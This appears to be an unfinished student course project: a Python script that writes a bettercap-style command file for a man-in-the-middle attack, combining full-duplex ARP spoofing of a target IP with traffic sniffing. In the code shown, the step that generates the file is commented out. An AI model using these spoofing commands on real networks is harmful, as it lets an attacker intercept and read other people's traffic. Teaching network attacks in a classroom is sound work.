import argparse
import subprocess
from random import choice
from string import ascii_letters
import socket

def gen_cap(file_name, target_ip):
    with open(file_name, "w+") as file:
        lines = [
            "net.probe on\n",
            "set arp.spoof.fullduplex true\n", 
            f"set arp.spoof.targets {target_ip}\n",
            "arp.spoof on\n",
            "set net.sniff.local true\n",
            "net.sniff on"
        ]

        file.writelines(lines)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="mac-spoof",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="A program which performs a MITM attack by spoofing the MAC address. (INFOST 695-001 Final Project)",
        epilog="Copyright © 2024 Hemanth Chinnappa, Kevin Agyei, Lauren Rodriguez, & Cedar Lehman.\nSee LICENSE file for more details."
    )
    parser.add_argument("target", help="IP of the computer you want to target")
    args = parser.parse_args()

    # test to see if IP is valid
    try:
        socket.inet_aton(args.target)
    except socket.error:
        parser.error(f"target '{args.target}' is not a valid IP address")

    temp_file = '/tmp/mac-address-spoofer-' + ''.join(choice(ascii_letters) for i in range(10)) + '.cap'
    print(temp_file)

    # gen_cap(temp_file, )
        
